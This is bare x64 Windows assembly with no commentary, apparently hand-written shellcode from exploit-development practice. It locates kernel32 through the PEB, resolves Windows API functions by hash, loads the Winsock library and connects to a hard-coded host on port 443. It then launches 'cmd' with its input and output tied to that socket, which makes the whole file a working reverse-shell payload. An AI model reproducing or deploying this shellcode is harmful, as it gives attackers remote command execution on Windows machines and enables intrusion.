start:
    mov rbp, rsp
    sub rsp, 1600
resolve_kernel32:
    mov dl, 0x4b
    mov rcx, 0x60
    mov r8, gs:[rcx]
    mov rdi, [r8 + 0x18]
    mov rdi, [rdi + 0x30]
search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]
    mov rsi, [rdi + 0x40]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search
find_function_jmp:
    jmp callback
get_find_function_addr:
    pop rsi
    mov [rbp + 0x8], rsi
    jmp resolve_k32_sym
callback:
    call get_find_function_addr
find_function:
    add rsp, 8
    pop rax
    push -1
    add rsp, rax
find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]
    mov edi, [rbx + rax + 0x88]
    add rdi, rbx
    mov ecx, [rdi + 24]
    mov eax, [rdi + 32]
    add rax, rbx
    mov [rbp - 8], rax
find_function_loop:
    dec ecx
    mov rax, [rbp - 8]
    mov esi, [rax + rcx * 4]
    add rsi, rbx
compute_hash:
    xor rax, rax
    cdq
compute_hash_repeat:
    ror edx, 0xd
    add edx, eax
    lodsb
    test al, al
    jnz compute_hash_repeat
find_function_compare:
    cmp edx, [rsp - 8]
    jnz find_function_loop
    mov edx, [rdi + 36]
    add rdx, rbx
    mov cx, [rdx + 2 * rcx]
    mov edx, [rdi + 28]
    add rdx, rbx
    mov eax, [rdx + 4 * rcx]
    add rax, rbx
    push rax
    mov rax, [rsp - 8]
    cmp rax, -1
    jnz find_function_loop2
find_function_finish:
    sub rsp, 16
    ret
resolve_k32_sym:
    mov rax, 0x00000000ec0e4e8e
    push rax
    mov rax, 0x0000000016b3fe72
    push rax
    mov rax, 0x0000000078b5b983
    push rax
    mov rax, 32
    push rax
    call [rbp + 8]
load_ws2_32:
    mov rax, 0x0000000000006C6C
    push rax
    mov rax, 0x642E32335F327377
    push rax
    mov rcx, rsp
    sub rsp, 40
    call [rsp + 80]
    nop
resolve_ws2_sym:
    mov rbx, rax
    mov rax, 0x0000000060aaf9ec
    push rax
    mov rax, 0x00000000adf509d9
    push rax
    mov rax, 0x000000003bfcedcb
    push rax
    mov rax, 32
    push rax
    call [rbp + 8]
    sub rsp, 512
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rsp + 800]
    call [rsp + 520]
call_WSASocketA:
    mov rcx, 2
    mov rdx, 1
    mov r8, 6
    xor r9, r9
    mov [rsp + 32], r9
    mov [rsp + 40], r9
    call [rsp + 528]
call_connect:
    mov rsi, rax
    mov rcx, rax
    mov r8, 16
    mov r9, 0x9d2da8c0bb010002
    lea rdx, [rsp + 800]
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 8], r9
    call [rsp + 536]
create_STARTUPINFOA:
    lea rdi, [rsp + 800]
    add rdi, 0x300
    mov rbx, rdi
    xor eax, eax
    mov ecx, 0x20
    rep stosd
    mov eax, 0x68
    mov [rbx], eax
    mov eax, 0x101
    mov [rbx + 0x3c], eax
    mov [rbx + 0x50], rsi
    mov [rbx + 0x58], rsi
    mov [rbx + 0x60], rsi
call_CreateProccessA:
    xor rax, rax
    xor rcx, rcx
    lea rdx, [rsp + 800]
    add rdx, 0x180
    mov eax, 0x646d63
    mov [rdx], rax
    xor r8, r8
    xor r9, r9
    xor rax, rax
    inc eax
    mov [rsp + 0x20], rax
    dec eax
    mov [rsp + 0x28], rax
    mov [rsp + 0x30], rax
    mov [rsp + 0x38], rax
    mov [rsp + 0x40], rbx
    add rbx, 0x68
    mov [rsp + 0x48], rbx
    call [rsp + 616]
call_TerminateProcess:
    xor rcx, rcx
    dec rcx
    xor rdx, rdx
    int3
    call [rsp + 608]